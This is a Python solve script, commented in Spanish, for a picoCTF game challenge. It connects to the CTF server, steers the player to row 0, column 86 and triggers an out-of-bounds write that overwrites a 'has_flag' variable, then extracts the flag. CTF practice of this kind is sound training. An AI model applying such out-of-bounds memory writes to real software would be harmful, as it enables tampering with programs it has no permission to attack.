import socket, time, re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('saturn.picoctf.net', 59375))
time.sleep(0.3)
initial = s.recv(8192).decode(errors='ignore')

print("Conectado. Enviando secuencia...\n")

# Estrategia final: ir a (0, 86), usar 'l' + char no-nulo, mover arriba
# Esto escribirá en (-1, 86) = map[-90 + 86] = map[-4] = has_flag

# Ir a row=0
for i in range(4):
    s.send(b'w\n')
    time.sleep(0.1)

# Ir a col=86
for i in range(82):
    s.send(b'd\n')
    time.sleep(0.04)

time.sleep(0.5)

# Ver posición
data = s.recv(8192).decode(errors='ignore')
print("Posición antes de 'l':")
for line in data.split('\n'):
    if 'Player position' in line:
        print(f"  {line}")

# 'l' + carácter
s.send(b'l')
time.sleep(0.15)
s.send(b'b')  # Minúscula
time.sleep(0.15)

# Mover arriba
s.send(b'w\n')
time.sleep(0.6)

data = s.recv(8192).decode(errors='ignore')

print("\nDespués de 'l' + 'b' + 'w':")
if 'flag: 1' in data:
    print("¡FLAG ACTIVADA!")
    
    # Ganar
    s.send(b'p\n')
    time.sleep(3)
    
    all_data = b''
    while True:
        try:
            s.settimeout(0.5)
            chunk = s.recv(4096)
            if not chunk:
                break
            all_data += chunk
        except:
            break
    
    final_text = all_data.decode(errors='ignore')
    match = re.search(r'picoCTF\{[^}]+\}', final_text)
    if match:
        print(f"\n{'='*60}")
        print(f"FLAG: {match.group()}")
        print(f"{'='*60}")
    else:
        print("No se encontró flag en el output")
        print(final_text[-200:])
else:
    lines = [l for l in data.split('\n') if l.strip()]
    for line in lines[-15:]:
        print(line)

s.close()
